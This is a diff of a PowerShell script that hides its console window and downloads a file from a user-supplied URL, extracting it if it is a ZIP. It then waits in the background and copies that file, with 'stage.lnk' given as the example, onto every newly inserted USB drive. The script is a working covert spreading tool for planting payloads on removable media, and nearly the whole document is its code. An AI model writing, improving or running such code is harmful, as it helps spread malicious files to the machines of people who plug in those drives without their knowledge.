@@ -2,7 +2,7 @@
 
 SYNOPSIS
 This script runs quietly in the background waiting for new USB storage devices.
-When a new storage device connects, this script will copy a desired file to the root of newly connected drive.
+When a new device connects, this script will copy a desired file to the root of newly connected drive.
 
 USAGE
 1. REPLACE the example file URL with your own.
@@ -13,16 +13,20 @@ USAGE
 
 #>
 
-# Replace with your file direct download link
-$fileURL = "$url"
+# Replace with your file direct download / raw link
+$fileURL = "$DLurl"
+$fileToCopy = "$File" # if zip is downloaded
 
-# Hidden Console
+if ($fileURL.length -eq 0){
+  $fileURL = read-host "Enter direct download file URL "
+}
+
+if ($fileToCopy.length -eq 0){
+  $fileToCopy = read-host "Enter the filename (eg. stage.lnk) "
+}
+
+# Hidden Console (y/n)
 $hidden = 'y'
-
-$filename = Split-Path -Path $fileURL -Leaf
-$filepath = "$env:TEMP/$filename"
-iwr -Uri $fileURL -OutFile $filepath
- 
 
 If ($hidden -eq 'y'){
     Write-Host "Hiding the Window.."  -ForegroundColor Red
@@ -41,8 +45,43 @@ If ($hidden -eq 'y'){
     }
 }
 
-while($true){
+function DownloadAndExtract-Zip {
+    param ([string]$fileURL,[string]$filename)
 
+    $filename = Split-Path -Path $fileURL -Leaf
+    $tempDir = [System.IO.Path]::GetTempPath()
+    $filepath = "$tempDir\$filename"
+
+    try {
+        Invoke-WebRequest -Uri $fileURL -OutFile $filepath
+        Write-Host "File downloaded to $filepath"
+    } catch {
+        Write-Error "Failed to download file from $fileURL"
+        return
+    }
+
+    if ($filename -like "*.zip") {
+        Write-Host "File is a ZIP archive. Extracting contents..."
+
+        $extractPath = $tempDir
+
+        try {
+            Add-Type -AssemblyName System.IO.Compression.FileSystem
+            [System.IO.Compression.ZipFile]::ExtractToDirectory($filepath, $extractPath)
+            Write-Host "Files extracted to $extractPath"
+        } catch {
+            Write-Error "Failed to extract the ZIP file"
+        }
+    } else {
+        Write-Host "Downloaded file is not a ZIP archive. No extraction needed."
+    }
+}
+
+DownloadAndExtract-Zip -fileURL $fileURL
+
+while($true){
+    $tempDir = [System.IO.Path]::GetTempPath()
+    $fileToCopy = "$tempDir\$fileToCopy"
     $initialDrives = Get-WMIObject Win32_LogicalDisk | ? {$_.DriveType -eq 2} | select DeviceID
     while ($true){
         $currentDrives = Get-WMIObject Win32_LogicalDisk | ? {$_.DriveType -eq 2} | select DeviceID
@@ -50,7 +89,7 @@ while($true){
         if ($newDrive){
             $drive = Get-WMIObject Win32_LogicalDisk | ? {$_.DriveType -eq 2} | Where-Object { $initialDrives.DeviceID -notcontains $_.DeviceID}
             $driveletter = ($drive.DeviceID + '/')
-            Copy-Item -Path $filepath -Destination $driveletter
+            Copy-Item -Path $fileToCopy -Destination $driveletter
             sleep 1
             break
         }
